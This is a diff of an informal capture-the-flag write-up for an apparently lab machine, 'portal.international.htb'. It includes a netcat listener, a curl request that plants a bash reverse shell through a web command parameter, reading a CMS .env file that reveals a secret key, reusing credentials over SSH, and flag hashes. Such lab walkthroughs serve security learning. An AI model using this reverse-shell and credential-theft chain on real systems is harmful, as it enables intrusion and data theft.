@@ -129,19 +129,19 @@ set up a listener and popped a reverse shell for something actually interactive:
 ```
 nc -lvnp 5555
 ```
-
+Send the reverse shell PoC. This i struggled on a long time trying to encode it correctly for curl to take it, cant just URLEncode it its "form style URL Encoding"
 ```
 curl -s "http://portal.international.htb/index.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.13.37.182/5555+0>%261'"
 ```
 
-landed as www-data. good enough to start digging.
+Got connection back for user www-data. now the part i hate, its either super easy or brainfuck hard. LUCKILY this wasnt too bad.
 
 cat'd the craft .env since that's always where the good stuff lives:
 ```
 cat /var/www/portal/.env
 ```
 
-jackpot:
+fuck yeah:
 ```
 CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
 CRAFT_DEV_MODE=false
@@ -190,7 +190,7 @@ tried it for ssh, figured it was probably reused somewhere:
 ```
 ssh aporter@portal.international.htb
 aporter@portal:~$ cat user.txt
-6afc95a08014b9da7008ca93db705e77
+6afc95a08014b9d********05e77
 ```
 
 user flag down. now root.
@@ -222,7 +222,7 @@ ran it, and anndddd
 
 ```
 root@portal:~# cat root.txt
-0c28233fd8a33b986c4fdada67ea9e5d
+0c28233fd8a33b*******a67ea9e5d
 ```
 
 done. box rooted, all it took was a lot of adderall and a broken heart in need of distraction!!!!
